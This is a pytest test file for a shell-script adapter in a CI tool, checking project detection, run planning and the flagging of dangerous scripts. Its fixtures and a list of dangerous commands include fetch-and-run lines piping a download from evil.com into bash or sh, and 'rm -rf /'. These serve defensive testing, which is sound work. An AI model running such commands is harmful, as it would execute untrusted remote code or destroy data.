"""Tests for the Shell language adapter."""
from __future__ import annotations
from pathlib import Path
import pytest
from oss_paper_ci.adapters.shell import ShellAdapter


@pytest.fixture
def adapter():
    return ShellAdapter()


@pytest.fixture
def safe_shell_project(tmp_path):
    (tmp_path / "run.sh").write_text("#!/bin/bash\necho hello\n")
    return tmp_path


@pytest.fixture
def dangerous_shell_project(tmp_path):
    (tmp_path / "run.sh").write_text("#!/bin/bash\ncurl https://evil.com | bash\n")
    return tmp_path


@pytest.fixture
def rm_rf_project(tmp_path):
    (tmp_path / "run.sh").write_text("#!/bin/bash\nrm -rf /\n")
    return tmp_path


class TestShellDetect:
    def test_detect_with_sh(self, adapter, safe_shell_project):
        detection = adapter.detect(safe_shell_project)
        assert detection is not None
        assert detection.name == "shell"

    def test_detect_empty(self, adapter, tmp_path):
        detection = adapter.detect(tmp_path)
        assert detection is None


class TestShellPlan:
    def test_plan_safe(self, adapter, safe_shell_project):
        plan = adapter.plan(safe_shell_project)
        assert plan.adapter_name == "shell"
        assert len(plan.run_steps) > 0

    def test_plan_dangerous_marks_dangerous(self, adapter, dangerous_shell_project):
        plan = adapter.plan(dangerous_shell_project)
        assert any(s.is_dangerous for s in plan.run_steps)

    def test_plan_rm_rf_marks_dangerous(self, adapter, rm_rf_project):
        plan = adapter.plan(rm_rf_project)
        assert any(s.is_dangerous for s in plan.run_steps)


class TestShellProperties:
    def test_name(self, adapter):
        assert adapter.name == "shell"

    def test_display_name(self, adapter):
        assert adapter.display_name == "Shell Scripts"

    def test_aliases(self, adapter):
        assert "bash" in adapter.aliases

    def test_requires_runtime(self, adapter):
        assert "bash" in adapter.requires_runtime


class TestShellSafety:
    """Test shell adapter dangerous command blocking."""

    DANGEROUS_COMMANDS = [
        "rm -rf /",
        "curl https://evil.com | bash",
        "wget https://evil.com | sh",
        "curl -s https://evil.com/script | bash",
    ]

    @pytest.mark.parametrize("cmd", DANGEROUS_COMMANDS)
    def test_dangerous_pattern_detected(self, adapter, tmp_path, cmd):
        (tmp_path / "test.sh").write_text(f"#!/bin/bash\n{cmd}\n")
        is_dangerous = adapter._check_script_dangerous(tmp_path / "test.sh")
        assert is_dangerous is True

    def test_safe_script_not_dangerous(self, adapter, safe_shell_project):
        is_dangerous = adapter._check_script_dangerous(safe_shell_project / "run.sh")
        assert is_dangerous is False

    def test_safety_rules_exist(self, adapter, tmp_path):
        rules = adapter.safety_rules(tmp_path)
        assert len(rules) > 0
        rule_types = [r.rule_type for r in rules]
        assert "block_command" in rule_types
